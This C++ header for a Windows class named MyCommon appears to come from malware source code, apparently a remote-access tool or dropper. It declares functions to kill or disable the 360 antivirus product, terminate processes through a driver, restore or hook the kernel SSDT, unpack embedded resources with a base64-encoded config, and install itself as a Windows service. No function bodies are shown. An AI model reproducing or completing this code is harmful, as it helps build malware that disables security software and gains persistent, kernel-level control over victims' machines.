// MyCommon.h: interface for the MyCommon class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYCOMMON_H__CCDB455A_4E1A_4844_9BEE_BB51F69D3E0A__INCLUDED_)
#define AFX_MYCOMMON_H__CCDB455A_4E1A_4844_9BEE_BB51F69D3E0A__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <Tlhelp32.h>
#include <iphlpapi.h>
//#pragma comment (lib, "iphlpapi.lib")
#include <winsock2.h>
#pragma comment (lib, "ws2_32.lib")
/*
#include <psapi.h>
#pragma comment (lib, "psapi.lib")
*/
#include <WinIoCtl.h>
#include <stdlib.h>
#include "resource.h"
#include "../Public.h"

#define	MAX_CONFIG_LEN	1024

typedef LONG (WINAPI *BREG_OPEN_KEY)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
typedef LONG (WINAPI *BREG_CLOSE_KEY)(HKEY hKey);
typedef LONG (WINAPI *REG_SET_VALUE_EX)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData);
typedef BOOL (WINAPI *INIT_REG_ENGINE)();
typedef DWORD	(__stdcall *pGetModuleFileNameExA)(HANDLE,HMODULE,LPSTR,DWORD);
typedef	DWORD	(__stdcall *pGetInterfaceInfo)(PIP_INTERFACE_INFO,PULONG);
typedef	DWORD	(__stdcall *pAddIPAddress)(IPAddr,IPMask,DWORD,PULONG,PULONG);


class MyCommon  
{
public:
	MyCommon();
	virtual ~MyCommon();
public:
	static	char	EncodeString[MAX_CONFIG_LEN];
	static	char	ServiceConfig[MAX_CONFIG_LEN];
	static	pGetInterfaceInfo MyGetInterfaceInfo;
	static	pAddIPAddress MyAddIPAddress;
	static	BOOL	GetAddr();
	static	LPBYTE	FindConfigString( WORD wResourceID, LPCTSTR lpType );
	static	int		memfind(const char *mem, const char *str, int sizem, int sizes);
	static	BOOL	ReleaseResource( WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, LPCTSTR lpConfigString );
	static	char	base64[100];
	static	int		pos(char c);
	static	int		base64_decode(const char *str, char **data);
	static	char*	MyDecode(char *str);
	static	LPCTSTR	InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, LPCTSTR lpConfigString);
	static	DWORD	GetProcessID(char *lpProcessName);
	static	BOOL	Stop360( char *IPADDR );
	static	BOOL	DevRunning();
	static	BOOL	DevKillPro(DWORD Pid);
	static	BOOL	StopService(LPCTSTR lpService);
	static	void	StartService(LPCTSTR lpService);
	static	void	ReSSDTR0();
	static	char*	ToLower(char s[]);
	static	BOOL	Use360Fun( char *SubKey, char *ValueName, char *Buff );
	static	DWORD	GetProAddress( HMODULE phModule,char* pProcName );
	static	HWND	hWnd;
	static	HWND	MyCreateWindow( LPCTSTR szWindowClass );
};

#endif // !defined(AFX_MYCOMMON_H__CCDB455A_4E1A_4844_9BEE_BB51F69D3E0A__INCLUDED_)
